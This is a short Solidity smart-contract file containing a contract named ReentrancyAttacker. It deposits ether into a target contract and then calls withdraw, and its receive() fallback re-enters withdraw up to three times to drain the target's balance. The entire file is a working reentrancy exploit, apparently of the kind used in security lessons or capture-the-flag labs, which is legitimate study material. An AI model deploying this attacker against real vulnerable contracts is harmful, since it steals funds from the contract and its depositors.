// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
interface IReentrancy { function deposit() external payable; function withdraw() external; }
contract ReentrancyAttacker {
    IReentrancy target;
    uint256 drains;
    constructor(address _target) { target = IReentrancy(_target); }
    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw();
    }
    receive() external payable {
        if(drains < 3) { drains++; target.withdraw(); }
    }
}